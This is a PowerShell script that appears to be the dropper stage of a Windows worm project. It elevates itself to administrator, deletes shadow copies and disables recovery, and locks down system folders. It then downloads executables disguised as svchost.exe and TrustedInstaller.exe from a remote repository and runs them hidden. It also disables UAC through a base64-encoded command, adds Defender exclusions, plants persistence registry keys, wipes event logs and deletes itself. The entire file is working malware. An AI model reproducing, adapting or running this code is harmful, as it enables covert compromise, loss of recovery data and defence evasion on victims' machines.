$s = $MyInvocation.MyCommand.Path
$e = (Get-Process -Id $PID).Path
$f = if ($s) { $s } else { $e }
if(-not (([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator))){
    Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$f" -Verb RunAs
    exit 1
}
$user = ((Get-CimInstance -ClassName Win32_ComputerSystem).UserName -split '\\')[-1]
$initServiceRootmonmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_rootmonmon.ps1"
$initServiceFwdmonUri = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwdmon.ps1"
$initFinde = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/finde.exe"
$ftpUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/TrustedInstaller.exe"
$serverUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/RuntimeBrokerHelper.exe"
$usbUrl = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/worm/svchost.exe"
$paths =  @(
    "$env:windir\system32\config\systemprofile\AppData\Local",
    "$env:windir\system32\LogFiles\WMI\RtBackup\AutoRecover\alpha\beta\gamma\unibeta\trioalpha\shadowdelta",
    "$env:windir\Microsoft.NET\assembly\GAC_MSIL\PolicyCache\v4.0_Subscription\en-US\Resources\Temp",
    "$env:windir\Microsoft.NET\assembly\GAC_64\PolicyCache\v4.0_Subscription\en\Temp\ShadowCopy",
    "$env:windir\Logs\CBS\SddlCache\Backup\DiagTrack\Analytics\Upload", # check later
    "$env:windir\Resources\Themes\Cursors\Backup\MicrosoftStore",
    "$env:windir\System32\Tasks\Microsoft\Windows\PLA\System\Diagnostics\ETL\Traces\Archived",
    "$env:windir\System32\DriverStore\FileRepository\netrndis-inf_amd64_abcd1234efgh5678\ConfigBackup",
    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
    ($env:systemdrive + "\Recovery"),
    "$env:ProgramData\Microsoft\WindowsDefender\Platform\Config\MpEngine\Quarantine\Volatile",
    "$env:ProgramData\Microsoft\EdgeCore\modules\stable_winupdate_aux\cache\media_metrics\prefetch",
    "$env:ProgramData\Microsoft\Windows\AppRepository\StateCache\CacheIndex\Staging\DriverStore",
    "$env:ProgramData\Microsoft\Edge\DevTools\HeapSnapshots\Cache\IndexedDB\dump",
    "$env:ProgramData\Microsoft\Diagnosis\DownloadedSettings\Symbols\Public\CrashDump",
    "$env:windir\system32\spool\drivers\x64\3\en-US",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls",
    "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls\5645725642",
    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
    "$env:windir\WinSxS\amd64_netfx4-fusion-dll-b03f5f7f11d50a3a_4015840_none_19b5d9c7ab39bf74\microsoft\windows\servicingstack\Temp\Symbols\Debug",
    "$env:windir\WinSxS\Manifests\x86_microsoft_windows_servicingstack_31bf3856ad364e35\Backup\Analytics\Cache",
    "$env:windir\WinSxS\Catalogs\Index\Staging\DriverCache\ShadowCopy\Microsoft\Windows\Tasks\Services\Minidump",
    "$env:windir\WinSxS\Manifests\amd64_abcdef0123456789_manifest\microsoft\windows\ProgramCache\ShadowCopy\Universal\Debug\Logs",
    "$env:windir\WinSxS\Manifests\wow64_microsoft-windows-ability-assistant-db-31bf3856ad364e35_10_0_19041_4597_none_c873f8fba7f2e1a5\ProgramData\Ammnune\Acids\Backups\Logs\Recovery\SelectedFiles",
    "$env:windir\WinSxS\Temp\Microsoft\Windows\Logs\Dump\CrashReports",
    "$env:windir\WinSxS\ManifestCache\x86_netfx35linq_fusion_dll_b03f5f7f11d50a3a_4015840_cache",
    "$env:windir\WinSxS\ManifestCache\x86_microsoft-windows_servicingstack_31bf3856ad364e35_100190413636_none_9ab8d1c1a1a8a1f0\ServiceStack\Programs\Updates",
    "$env:windir\WinSxS\ManifestCache\amd64_microsoft-windows-aence-mitigations-c1_31bf3856ad364e35-100226212506_none_9a1f2d8e1d4c3f07",
    "$env:windir\WinSxS\ManifestCache\x86_microsoft-windows-sgstack-servicingapi_31bf3856ad364e35_100190413636_none_0c8e1a1d3d0b0a1f",
    "$env:windir\WinSxS\Backup\KB5034441_amd64_1234567890abcdef",
    "$env:windir\WinSxS\Backup\wow64_microsoft-windows-ued-telemetry-client_31bf3856ad364e35_100226212506_none_1b3f8c7f1a9d0d42",
    "$env:windir\WinSxS\Backup\amd64_netfx4-mscordacwks_b03f5f7f11d50a3a_4015744161_none_1a2b3c4d5e6f7d89",
    "$env:windir\WinSxS\Backup\x86_presentationcore_31bf3856ad364e35_61760117514_none_49d7b7f5b8f0b0d5",
    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\WinX",
    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Logs\Backup\Temp",
    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft\Windows\Caches\CRMDatabase\Index"
)

$ownership = @(
    "$env:windir\WinSxS",
    "$env:windir\WinSxS\FileMaps",
    "$env:windir\WinSxS\Catalogs",
    "$env:windir\WinSxS\Manifests",
    "$env:windir\WinSxS\Temp",
    "$env:windir\WinSxS\ManifestCache",
    "$env:windir\WinSxS\Backup",
    "$env:windir\ServiceProfiles\LocalService",
    "$env:windir\ServiceProfiles\LocalService\AppData\Local\Microsoft",
    "$env:windir\system32\LogFiles\WMI\RtBackup",
    "$env:windir\System32\DriverStore\FileRepository",
    "$env:windir\Logs\CBS",
    "$env:ProgramData\Microsoft\Windows\AppRepository"
)
Disable-ComputerRestore -Drive "$env:systemdrive\"
vssadmin delete shadows /for=$env:systemdrive /all /quiet | Out-Null
net stop vss
sc.exe config vss start= disabled
Get-Service vss | Select-Object Status, StartType # debug purpose
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name


foreach ($path in $ownership) {
    if($path -eq "$env:windir\WinSxS\ManifestCache"){
        if(-not(Test-Path -Path "$env:windir\WinSxS\ManifestCache" -PathType Container)){
            New-Item -Path "$path" -ItemType Directory -Force
        }
    }
    takeown /F "$path"
    icacls "$path" /inheritance:r /Q
    icacls "$path" /grant:r "$($user):(OI)(CI)F" "NT AUTHORITY\SYSTEM:(OI)(CI)F" /Q
    icacls "$path" /remove "Administrators" "Users" "Authenticated Users" "Everyone" /Q
    icacls "$path" /remove "BUILTIN\Administrators" "BUILTIN\Users" "Everyone" "NT AUTHORITY\Authenticated Users" /Q
    icacls "$path" /setowner "NT AUTHORITY\SYSTEM" /Q
}

foreach($path in $paths){
    if(-not(Test-Path -Path "$path" -PathType Container)){
        New-Item -Path "$path" -ItemType Directory -Force
    }
    if($path -eq "$env:windir\WinSxS\Temp\ManifestCache\PendingInstalls"){
        1..1000|ForEach-Object{New-Item -Path "$path\$(Get-Random)" -ItemType Directory -Force}
    }
}

foreach($path in $paths){
    try{
        iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/random1.txt" -OutFile "$path\text.txt"
    }catch{
        Write-Output "ERROR: $_"
    }finally {
        if(Test-Path -Path "$path\text.txt" -PathType Leaf){ Remove-Item -Path "$path\text.txt" -Force }
    }
}


$initServiceRootmonmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initServiceRootmonmonPath = "$initServiceRootmonmonPath\init_service_rootmonmon.ps1"
$initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initServiceFwdmonPath = "$initServiceFwdmonPath\init_service_fwdmon.ps1"
$initFindePath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$initFindePath = "$initFindePath\$([System.IO.Path]::GetRandomFileName()).exe"
$serverPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\$([System.IO.Path]::GetRandomFileName()).exe"
$ftpPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\$([System.IO.Path]::GetRandomFileName()).exe"
$usbPath = "$($paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)])\$([System.IO.Path]::GetRandomFileName()).exe"
$g = "{$([guid]::NewGuid().ToString().ToUpper())}"
$basePath = "HKLM:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
$main = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
New-Item -Path "$basePath" -Force
New-ItemProperty -Path "$basePath" -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
if(-not(Test-Path -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl")){
    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Force
}
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "AutoReboot" -Value 0 -Force
if(-not(Test-Path -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU")){
    New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Force
}
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoRebootWithLoggedOnUsers" -Value 1 -Force
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v SFCDisable /t REG_DWORD /d 1 /f
$ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs", "Windows_Defender_CrashDumps", "ServiceHost_Spooler", "RDP_Encryption_Junk", "NVIDIA_Driver_Dumpster", "UpdateOrchestrator_Failures", "LSA_Secret_Trash", "WMI_Execution_Garbage", "TaskScheduler_Fuckups", "MSI_Installer_Leftovers", "EventLog_Bloatware", "PowerShell_Module_Clutter", "NetFramework_BrokenAssemblies", "BITS_Transfer_Corruption", "CredentialManager_Leaks", "Firewall_Rule_Chaos" ) 
$p = Get-Random -Count $ms.Length -In (1..1369)
$score = Get-Random -Minimum 184 -Maximum 1023
$rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
$rootPath = "$rootPath\root.ps1"
iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
iwr -Uri $initFinde -OutFile $initFindePath
iwr -Uri $serverUrl -OutFile $serverPath
iwr -Uri $ftpUrl -OutFile $ftpPath
iwr -Uri $usbUrl -OutFile $usbPath
Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initFindePath" -Wait
Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$serverPath"
Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$ftpPath"
Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$usbPath"




1..1370 | ForEach-Object {
    $curr = $_
    if($p.Contains($curr)){
        $idx = 0..($p.Count - 1) | Where-Object { $p[$_] -eq $curr }
        New-Item -Path "$basePath\$($ms[$idx])" -Force | Out-Null
        New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force
        New-ItemProperty -Path "$basePath\$($ms[$idx])" -Name "Authority" -Value "SYSTEM" -Force
    }
    if($curr -eq $score){   
        New-Item -Path "$basePath\$main" -Force | Out-Null  
    }


    $subName = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 13 | % { [char]$_ })
    New-Item -Path "$basePath\$subName" -Force | Out-Null
    New-ItemProperty -Path "$basePath\$subName" -Name "LastUpdated" -Value (Get-Date ((Get-Date).AddDays(-23)) -Format "yyyyMMdd") -Force | Out-Null
    New-ItemProperty -Path "$basePath\$subName" -Name "ThreadingModel" -Value "Apartment" -Force | Out-Null
}






Powershell -enc "UwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBMAE0AOgBTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABwAG8AbABpAGMAaQBlAHMAXABzAHkAcwB0AGUAbQAgAC0ATgBhAG0AZQAgAEUAbgBhAGIAbABlAEwAVQBBACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAwACAALQBGAG8AcgBjAGUADQAKAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIABIAEsATABNADoAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAcABvAGwAaQBjAGkAZQBzAFwAcwB5AHMAdABlAG0AIAAtAE4AYQBtAGUAIABDAG8AbgBzAGUAbgB0AFAAcgBvAG0AcAB0AEIAZQBoAGEAdgBpAG8AcgBBAGQAbQBpAG4AIAAtAFQAeQBwAGUAIABEAFcAbwByAGQAIAAtAFYAYQBsAHUAZQAgADAAIAAtAEYAbwByAGMAZQANAAoAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgAEgASwBMAE0AOgBTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABwAG8AbABpAGMAaQBlAHMAXABzAHkAcwB0AGUAbQAgAC0ATgBhAG0AZQAgAFAAcgBvAG0AcAB0AE8AbgBTAGUAYwB1AHIAZQBEAGUAcwBrAHQAbwBwACAALQBUAHkAcABlACAARABXAG8AcgBkACAALQBWAGEAbAB1AGUAIAAwACAALQBGAG8AcgBjAGUA"
foreach($path in $paths){
    $b = "reg add `"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths`" /v `"$path`" /f"
    $b = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b))
    Powershell -enc $b
}



Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initServiceFwdmonPath -basePath '$basePath\$main'" -Wait
Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\$main'"

Remove-Item -Path $initFindePath -Force -ErrorAction SilentlyContinue
Add-Content -Path "$env:temp\1572754491.txt" -Value "1572754491" -Force
wevtutil cl Security
wevtutil cl System 
wevtutil cl Application
wevtutil cl "Windows Powershell"
Clear-EventLog -LogName "Windows PowerShell"
Remove-Item -Path $f -Force -ErrorAction SilentlyContinue